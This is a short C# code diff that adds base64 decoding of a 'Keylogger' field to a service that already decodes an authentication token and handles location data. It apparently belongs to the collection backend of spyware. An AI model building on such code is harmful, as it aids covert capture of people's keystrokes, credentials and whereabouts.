@@ -30,6 +30,11 @@ namespace SilentWeb.Services
                     bulkData.Authentication.SecToken = System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(MakeUrlSafe(bulkData.Authentication.SecToken)));
                 }
 
+                if (DataChecker.CheckKeylogger(bulkData.Keylogger))
+                {
+                    bulkData.Keylogger = System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(MakeUrlSafe(bulkData.Keylogger)));
+                }
+
                 if (DataChecker.CheckLocation(bulkData.Location))
                 {
                     for (int i=0; i<bulkData.Location.Locations.Count; i++)
